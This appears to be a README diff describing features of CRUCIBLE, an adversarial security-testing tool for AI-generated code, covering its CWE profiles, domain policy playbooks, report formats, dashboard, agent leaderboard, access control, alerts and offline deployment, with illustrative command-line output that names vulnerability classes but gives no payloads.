+| **Python** | CWE-89, CWE-78, CWE-502, CWE-22, CWE-94, CWE-611, CWE-918, CWE-330 | SQLi, pickle, path traversal, XXE |
+| **Java** | CWE-89, CWE-502, CWE-78, CWE-611, CWE-918, CWE-863, CWE-362, CWE-22 | Deserialization, XXE, Spring auth gaps |
+| **Go** | CWE-89, CWE-78, CWE-362, CWE-476, CWE-22, CWE-918, CWE-770, CWE-674 | Race conditions, nil deref, goroutine leaks |
+
+Beyond language, CRUCIBLE detects surface signals that select sub-profiles:
+
+```
+async/Promise patterns  → prioritize race condition attacks (CWE-362)
+filesystem access       → prioritize path traversal (CWE-22)
+eval / dynamic exec     → prioritize injection (CWE-94)
+React / Next.js         → prioritize XSS and CORS (CWE-79, CWE-346)
+NestJS / Spring         → prioritize authentication and BOLA (CWE-285, CWE-639)
+Go web framework        → prioritize SSRF and resource exhaustion (CWE-918, CWE-770)
+```
+
+---
+
+### Feature 5 — BreakContext Token Compression
+
+**The problem it solves:** The Breaker's prompt contains three inputs that can be expensive in tokens: the target specification, past attacks recalled from the Forge, and CWE context strings. In thorough mode with 50 attacks and a rich Forge recall, naive prompts can exceed 40,000 tokens per attack — prohibitively expensive at scale.
+
+**What it does:** **BreakContext** applies three independent compression algorithms to Breaker *inputs only* — the Arbiter never sees compressed data, preserving scoring accuracy.
+
+1. **Target compression** — extracts security-relevant lines (authentication, validation, database calls, file I/O, cryptography, authorization checks) plus a ±2 line context window. Always keeps the first 10 lines. Boring boilerplate is dropped.
+
+2. **Forge recall deduplication** — removes past attacks with >65% Jaccard word overlap (near-duplicates provide no marginal signal to the Breaker). Each retained attack is truncated to 250 characters.
+
+3. **CWE context collapsing** — multi-line CWE descriptions are collapsed to single lines capped at 120 characters.
+
+```
+$ crucible run --issue large_spec.md --mode thorough --pretty
+
+  [break_context]  target:    1,240 lines → 287 lines kept  (77% reduction)
+  [break_context]  recall:    18 attacks  →  11 unique kept (39% reduction)
+  [break_context]  cwe_ctx:   4,200 chars →  840 chars      (80% reduction)
+  [break_context]  total:     62,400 chars → 38,100 chars   (39% overall reduction)
+  [break_context]  Arbiter:   NOT compressed (full fidelity for scoring)
+```
+
+BreakContext is enabled by default and can be disabled per-project:
+
+```yaml
+# .crucible.yml
+combat_pair:
+  break_context_enabled: false   # disable for maximum Breaker context fidelity
+```
+
+---
+
+### Feature 6 — Adversarial Policy Engine (APE) + Policy Hub
+
+**The problem it solves:** A generic OWASP Top 10 scan gives you generic results. A healthcare company's threat model is fundamentally different from a fintech's — and both are different from a government contractor's. Without domain context, the Breaker generates attacks that are technically valid but miss the actual regulatory exposure.
+
+**What it does:** The **Adversarial Policy Engine** loads YAML domain playbooks that encode domain-specific threat scenarios, regulatory control mappings, and CWE priorities. The chosen domain's context is passed directly to the Breaker as policy context, steering it toward domain-relevant attacks.
+
+**Running with HIPAA domain:**
+
+```bash
+$ crucible run --issue patient_api_spec.md --mode standard --domain hipaa --pretty
+
+  [policy]  domain: hipaa (10 scenarios loaded)
+  [policy]  context: "PHI handling — prioritize CWE-311 (unencrypted PHI), CWE-200
+             (PHI disclosure in errors), CWE-359 (de-identification failure),
+             CWE-287 (broken authentication to PHI endpoints)"
+
+  ARS Score: 0.75  ❌ FAILED (gate: 0.80)
+
+  Attack breakdown:
+  ✅ CWE-311  PHI stored without encryption at rest         score: 1.0  mitigated
+  ✅ CWE-287  Unauthenticated access to /patients endpoint  score: 1.0  mitigated
+  ❌ CWE-200  PHI exposure in 500 error response            score: 0.0  MISSED
+  ❌ CWE-359  Patient DOB returned without de-identification score: 0.0  MISSED
+  ✅ CWE-532  PHI logged in access logs                     score: 1.0  mitigated
+  ...
+```
+
+**Built-in domains:**
+
+```
+$ crucible policy list
+
+  Built-in domains:
+  ┌─────────────────────────┬───────────┬─────────────────────────────────────────────┐
+  │ Domain                  │ Scenarios │ Focus areas                                 │
+  ├─────────────────────────┼───────────┼─────────────────────────────────────────────┤
+  │ owasp_top10             │ 10        │ Injection, broken auth, XSS, IDOR, misconfig│
+  │ owasp_api_security      │ 10        │ BOLA, BOPLA, SSRF, unsafe deserialization   │
+  │ hipaa                   │ 10        │ PHI at rest, PHI disclosure, de-identification│
+  │ finra                   │  9        │ AML bypass, authorization gaps, key mgmt    │
+  │ pci_dss                 │  8        │ CHD scope, network segmentation, key storage│
+  │ soc2                    │  7        │ CC6/CC7/CC8 logical access controls         │
+  │ nist_ssdf               │  8        │ PW.4 input validation, RV.2, PW.8           │
+  └─────────────────────────┴───────────┴─────────────────────────────────────────────┘
+
+  Installed user domains: (none)
+  Install more: crucible policy hub
+```
+
+**The Policy Hub** lets you install community-contributed domains without modifying source:
+
+```bash
+$ crucible policy hub
+
+  CRUCIBLE Policy Hub — Available Domains
+  ─────────────────────────────────────────────────────────────────
+  owasp_api_security   v2023.1   10 scenarios  [api, rest, graphql, owasp]
+  nist_ssdf            v1.1       8 scenarios  [nist, government, supply-chain]
+  cis_controls         v8.0       6 scenarios  [cis, enterprise]
+  ─────────────────────────────────────────────────────────────────
+
+$ crucible policy install owasp_api_security
+  ✅ Installed owasp_api_security → .crucible/policies/owasp_api_security.yaml
+
+$ crucible policy search "broker dealer"
+  Found: finra (tag: broker-dealer, aml, finra)
+```
+
+---
+
+### Feature 7 — SARIF 2.1.0, JUnit XML, and HTML Resilience Reports
+
+**The problem it solves:** Security findings are only useful if they reach the people who can act on them — and in the formats those people's tools already understand. A JSON file in a reports directory is not a GitHub Code Scanning alert. A Markdown summary is not a CI dashboard test result. A PDF is not a compliance audit artifact.
+
+**What it does:** CRUCIBLE emits three output formats simultaneously from every run, each designed for a different audience.
+
+**SARIF 2.1.0 → GitHub Code Scanning**
+
+Every missed attack (score < 1.0) appears as an open security alert in your repository's Security → Code Scanning view. Security teams see the CWE, severity, and description without leaving GitHub.
+
+```bash
+crucible run --issue spec.md --output-sarif crucible.sarif
+# Then in GitHub Actions:
+# uses: github/codeql-action/upload-sarif@v3
+```
+
+```
+GitHub Security Tab — Code Scanning Alerts
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚠ CWE-79  HIGH    Reflected XSS in error message response
+          Rule: CWE-79 | Tool: CRUCIBLE | Branch: feature/user-auth
+          Introduced in: crucible-2026-06-28T12-00-00Z-a3f9
+
+⚠ CWE-200 MEDIUM  PHI exposure in 500 error response
+          Rule: CWE-200 | Tool: CRUCIBLE | Branch: feature/user-auth
+```
+
+**JUnit XML → CI Dashboards**
+
+Every attack becomes a test case. Mitigated attacks pass. Missed attacks fail with a descriptive failure message. Works with GitHub Actions test reporters, Jenkins, GitLab CI, CircleCI — any tool that reads JUnit XML.
+
+```
+GitHub Actions — CRUCIBLE Attack Results
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✅ CWE-89: SQL Injection via username param          PASSED
+✅ CWE-502: Unsafe deserialization — pickle object   PASSED
+✅ CWE-78: OS command injection in file path         PASSED
+✅ CWE-22: Path traversal in upload handler          PASSED
+❌ CWE-79: Reflected XSS in error message            FAILED
+   └ No output encoding applied to user-controlled error content
+```
+
+**HTML Resilience Report → Compliance Evidence**
+
+A self-contained HTML document with the full run summary, attack table, control mappings, and tamper-evident hash — downloadable from the Combat Dashboard for attachment to compliance tickets, audit packages, and board security reports.
+
+```bash
+crucible report <run_id> --format html > report.html
+# Or download from Combat Dashboard at /api/runs/<run_id>/html
+```
+
+---
+
+### Feature 8 — Combat Dashboard
+
+**The problem it solves:** Individual run reports are useful for developers who run CRUCIBLE manually. But for security teams managing 50 repositories and hundreds of runs per week, you need a centralized view: ARS trends over time, runs that failed the gate, evidence download for auditors, Forge Ledger statistics.
+
+**What it does:** The **Combat Dashboard** is a FastAPI web application (optional — `pip install crucible-ai[ui]`) that reads all reports from `.crucible/reports/` and presents them in a browser.
+
+```bash
+pip install "crucible-ai[ui]"
+crucible dashboard --port 8080
+```
+
+```
+┌──────────────────────────────────────────────────────────────────────────────┐
+│ ⚔️  CRUCIBLE Combat Dashboard                    [ARS Gate: 0.80]            │
+├──────────────────────────────────────────────────────────────────────────────┤
+│                                                                               │
+│  TOTAL RUNS    GATE PASSED    GATE FAILED    AVG ARS                         │
+│  ┌─────────┐  ┌─────────┐   ┌─────────┐   ┌─────────┐                       │
+│  │   47    │  │   38    │   │    9    │   │  0.871  │                       │
+│  └─────────┘  └─────────┘   └─────────┘   └─────────┘                       │
+│                                                                               │
+│  ARS Trend — Last 20 Runs                                                    │
+│  1.0 ┤                              ●    ●                                   │
+│  0.9 ┤          ●    ●    ●    ●─●─●    ●─●                                  │
+│  0.8 ┤ ──── ●─● │                            ●    ●──●                       │
+│  0.7 ┤     ○                                     ○                           │
+│      └──────────────────────────────────────────────── (runs, newest right)  │
+│        ● = PASS (ARS ≥ 0.80)    ○ = FAIL (ARS < 0.80)                       │
+│                                                                               │
+│  Runs (47)                                                                   │
+│  ┌──────────────────┬───────┬──────┬─────────┬───────┬────────────────────┐ │
+│  │ Run ID           │  ARS  │ Gate │ Attacks │ Missed│ Download           │ │
+│  ├──────────────────┼───────┼──────┼─────────┼───────┼────────────────────┤ │
+│  │ ...Z-a3f9        │ 0.870 │ PASS │    20   │   2   │ [HTML][SARIF][XML] │ │
+│  │ ...Z-b7d2        │ 0.750 │ FAIL │    20   │   5   │ [HTML][SARIF][XML] │ │
+│  │ ...Z-c1e8        │ 0.900 │ PASS │    20   │   2   │ [HTML][SARIF][XML] │ │
+│  └──────────────────┴───────┴──────┴─────────┴───────┴────────────────────┘ │
+└──────────────────────────────────────────────────────────────────────────────┘
+```
+
+The Dashboard exposes a REST API (`/api/runs`, `/api/runs/{id}`, `/api/vault/stats`) so it integrates with existing security dashboards — Grafana, Splunk, Datadog — via standard HTTP.
+
+---
+
+### Feature 9 — ARS Leaderboard — Benchmarking AI Coding Agents
+
+**The problem it solves:** SWE-bench measures whether an AI agent fixed the bug. It does not measure whether the fix introduced new vulnerabilities or left the attack surface undefended. As AI coding agents proliferate — Devin, SWE-agent, custom fine-tunes — teams need a security dimension to the evaluation.
+
+**What it does:** CRUCIBLE can score multiple AI agents against the same task set and rank them by adversarial resilience. Name your reports `<agent-name>--<task-id>.json` and run:
+
+```bash
+crucible leaderboard \
+  --reports-dir .crucible/reports \
+  --output docs/leaderboard.html
+```
+
+```
+┌──────────────────────────────────────────────────────────────────────────────┐
+│ ⚔️  CRUCIBLE ARS Leaderboard            Rank = avg_ARS×0.6 + pass_rate×0.4  │
+│    ARS Gate: 0.80 │ 4 agents │ 20 tasks                                      │
+├──────┬──────────────────┬─────────┬────────┬───────┬───────┬───────┬────────┤
+│ Rank │ Agent            │ Avg ARS │ Median │   Min │   Max │ Tasks │  Pass% │
+├──────┼──────────────────┼─────────┼────────┼───────┼───────┼───────┼────────┤
+│  🥇  │ agent-alpha      │  0.912  │  0.920 │ 0.800 │ 1.000 │   20  │ 95.0% │
+│  🥈  │ agent-beta       │  0.871  │  0.880 │ 0.750 │ 0.960 │   20  │ 80.0% │
+│  🥉  │ agent-gamma      │  0.834  │  0.840 │ 0.650 │ 0.920 │   20  │ 70.0% │
+│  #4  │ agent-delta      │  0.721  │  0.720 │ 0.500 │ 0.880 │   20  │ 45.0% │
+└──────┴──────────────────┴─────────┴────────┴───────┴───────┴───────┴────────┘
+```
+
+The output is a self-contained, sortable HTML page — click any column header to re-sort. Publish to GitHub Pages via `docs/leaderboard.html`. A JSONL input format is also supported for importing scores from external tools:
+
+```bash
+# JSONL format: one line per (agent, task) pair
+echo '{"agent_name":"gpt4o","task_id":"django-001","ars_score":0.85,"attack_count":20,"miss_count":3}' >> scores.jsonl
+crucible leaderboard --jsonl scores.jsonl --output docs/leaderboard.html
+```
+
+---
+
+### Feature 10 — Enterprise RBAC (GitHub Team-Based Access Control)
+
+**The problem it solves:** When CRUCIBLE runs as a shared service across an engineering organization, not everyone should have the same permissions. A junior engineer should be able to view reports but not override the ARS gate on a release branch. A security lead should be able to install new policy domains. A PR author should not be able to suppress their own failed run.
+
+**What it does:** CRUCIBLE maps GitHub team membership to three roles with a strict permission hierarchy. Role lookups hit the GitHub API once and are cached for 5 minutes — network failures degrade gracefully to `DEVELOPER` (least privilege).
+
+```
+$ crucible serve --rbac --port 8080
+
+  [rbac] RBAC enabled — GitHub org: acme-corp
+  [rbac] Admin teams:    security-leads, platform-admin
+  [rbac] Reviewer teams: backend-leads, security-review
+  [rbac] Developer:      any authenticated GitHub user
+
+  Role resolution:
+  ┌────────────────────────────────────────────────────────────────────┐
+  │ Role       │ Capabilities                                          │
+  ├────────────┼───────────────────────────────────────────────────────┤
+  │ Admin      │ Manage policies, set ARS gate, manage team assignments │
+  │ Reviewer   │ Trigger re-runs, override gate on individual PRs      │
+  │ Developer  │ View reports, download evidence (read-only)           │
+  └────────────┴───────────────────────────────────────────────────────┘
+```
+
+```bash
+# Configure via environment (never in config files — team names are org-specific)
+export CRUCIBLE_RBAC_ENABLED=true
+export GITHUB_ORG=acme-corp
+export CRUCIBLE_ADMIN_TEAMS=security-leads,platform-admin
+export CRUCIBLE_REVIEWER_TEAMS=backend-leads,security-review
+# CRUCIBLE_DEV_TEAMS defaults to: any authenticated GitHub user
+```
+
+---
+
+### Feature 11 — Forge Network (Opt-In Community Pattern Sharing)
+
+**The problem it solves:** The Knowledge Forge learns from your runs — but only your runs. A healthcare company might discover a novel PHI-exfiltration attack pattern in their HIPAA domain. A fintech might discover a new BOLA pattern in their trading API. These discoveries are valuable to the entire community — but no existing tool has a mechanism for sharing adversarial patterns without sharing sensitive code or business context.
+
+**What it does:** The **Forge Network** lets you share anonymized attack patterns with the community and receive patterns discovered by others. What is shared:
+
+- The attack vector description (text only, ≤500 characters)
+- The CWE identifier
+- The severity level
+- The verdict (mitigated / partial / missed)
+- The target language
+
+What is **never** shared: your code, your specification, your repository name, your organization, or any personally identifiable information.
+
+A stable 16-character anonymous contributor ID (SHA-256 of your git remote URL) identifies contributions — no usernames, no email addresses.
+
+```bash
+$ export CRUCIBLE_FORGE_NETWORK_ENABLED=true
+
+$ crucible forge-network status
+
+  Forge Network Status
+  ─────────────────────────────────────────────────────────────
+  Status:          ENABLED
+  Hub:             https://forge-network.crucible.dev
+  Contributor ID:  a7f3b2c91d4e5f60  (anonymous, derived from git remote)
+  Min ARS to share: 0.85 (high-quality mitigations + all missed attacks)
+  ─────────────────────────────────────────────────────────────
+  Hub statistics:
+    Total patterns:  12,847
+    Top CWEs:        CWE-89 (3,241), CWE-79 (2,108), CWE-502 (1,876)
+    Languages:       Python (4,120), JavaScript (3,847), Java (2,341), Go (1,891)
+
+$ crucible forge-network pull CWE-89
+  ✅ Pulled 42 SQL injection patterns from community hub
+     Top vectors: UNION SELECT bypass, stacked queries, error-based extraction
+     → Added to Forge recall context for next run
+```
+
+---
+
+### Feature 12 — Slack + Jira Alerts on Low-ARS Runs
+
+**The problem it solves:** A failed CI gate stops a merge — but it does not notify the security team, create a ticket for tracking, or capture the finding in the tool the team uses for vulnerability management. Security events that only exist in CI logs get lost.
+
+**What it does:** When ARS falls below `minimum_ars`, CRUCIBLE dispatches:
+
+1. A **Slack attachment** to the configured webhook with the run summary, top missed attacks, and a direct link to the Resilience Report
+2. A **Jira ticket** in the configured project with full attack descriptions, CWE references, severity, and the run ID for traceability
+
+Both are best-effort — a network failure on the notification path never blocks the CI gate or report generation.
+
+**Slack message (sent automatically when ARS < 0.80):**
+
+```
+┌──────────────────────────────────────────────────────────────────────┐
+│ 🔴 CRUCIBLE Security Alert — ARS Gate Failed                          │
+│                                                                       │
+│ Run ID:    crucible-2026-06-28T12-00-00Z-a3f9                        │
+│ ARS Score: 0.75  ❌  (required: ≥ 0.80)                               │
+│ Branch:    feature/payment-processor                                  │
+│                                                                       │
+│ Top missed attacks:                                                   │
+│   ❌ CWE-89  SQL injection via transaction_id param    score: 0.0     │
+│   ❌ CWE-200 Account balance exposed in error response score: 0.0     │
+│   ⚠️  CWE-502 Partial deserialization defense          score: 0.5     │
+│                                                                       │
+│ [View Report]  [Download SARIF]  [Open Jira Ticket]                  │
+└──────────────────────────────────────────────────────────────────────┘
+```
+
+```bash
+# Configure via environment variables (never in .crucible.yml)
+export SLACK_WEBHOOK_URL=https://hooks.slack.com/services/T.../B.../...
+export JIRA_BASE_URL=https://your-org.atlassian.net
+export JIRA_PROJECT=SEC
+export JIRA_TOKEN=your-api-token
+```
+
+---
+
+### Feature 13 — Domain Intelligence Adapter (Live Threat Intel via MCP)
+
+**The problem it solves:** CWE profiles and regulatory playbooks encode *historical* threat knowledge — patterns that were known when the profiles were written. Financial services, healthcare, and government security teams operate with live threat feeds: active CVEs, current attack campaigns, real-time intelligence about what threat actors are targeting today. This context should inform what the Breaker tests.
+
+**What it does:** The **Domain Intelligence Adapter (DIA)** consumes live threat intelligence from [Model Context Protocol (MCP)](https://modelcontextprotocol.io) servers — real-time threat feeds, CVE databases, sector-specific intelligence services — and enriches the Breaker's policy context before each run.
+
+```yaml
+# .crucible.yml — connect CRUCIBLE to your threat intel MCP server
+mcp_servers:
+  - name: fin-intel
+    url: http://your-threat-intel-server:8090/mcp
+    tool: get_finra_threats
+    params:
+      sector: broker-dealer
+    enabled: true
+```
+
+```
+$ crucible run --issue trading_api_spec.md --mode standard --domain finra --pretty
+
+  [dia]  fin-intel: enriching policy context...
+  [dia]  fin-intel: ✅ received 2,100 chars of live threat intel
+  [dia]  context enriched: "FINRA broker-dealer — 2026-06-28 threat update:
+          Active campaign targeting order routing APIs with BOLA attacks;
+          CVE-2026-4421 affects common JWT validation libraries;
+          Elevated AML bypass attempts via layered micro-transaction patterns"
+  [policy]  domain: finra + live intel (enriched)
+  ...
+```
+
+> **Note:** CRUCIBLE is a *consumer* of MCP servers — it calls them via JSON-RPC 2.0 `tools/call`. CRUCIBLE does not implement the MCP server protocol. Its 60–90s runtime is architecturally incompatible with MCP's sub-second response contract.
+
+---
+
+### Feature 14 — Air-Gap / Full On-Premises Operation
+
+**The problem it solves:** Every cloud-based security tool creates a data sovereignty problem. If your code generation prompt or your specification contains proprietary business logic — and it will, for any real-world enterprise — sending it to an external API endpoint is a compliance risk. Healthcare companies cannot send PHI context to a cloud model. Defense contractors cannot send specification text to an external API. Financial institutions face regulatory constraints on what data leaves their network.
+
+**What it does:** CRUCIBLE's entire engine runs offline using [Ollama](https://ollama.ai). No internet connection required. No data leaves your network. ChromaDB runs as an embedded database — no external vector DB service needed. All reports stay local.
+
+```yaml
+# .crucible.yml — full air-gap configuration
+deployment:
+  model_provider: local
+  local_model: llama3.3:70b    # or llama3.1:8b, mistral:7b, codellama:34b
+```
+
+```bash
+# Verify no network calls are made
+crucible doctor --strict
+# ✅ Model:   llama3.3:70b (local Ollama, no outbound calls)
+# ✅ Forge:   ChromaDB embedded at .crucible/forge/ (no external DB)
+# ✅ Ledger:  .crucible/vault/ (local filesystem only)
+# ✅ Reports: .crucible/reports/ (local filesystem only)
+# ✅ Telemetry: NONE
+```
+
+For Docker-based on-premises deployment:
+
+```bash
+# Self-contained stack — everything in your private network
+docker compose up -d    # ChromaDB + CRUCIBLE + (optionally) Ollama
+```
 
 ---
 
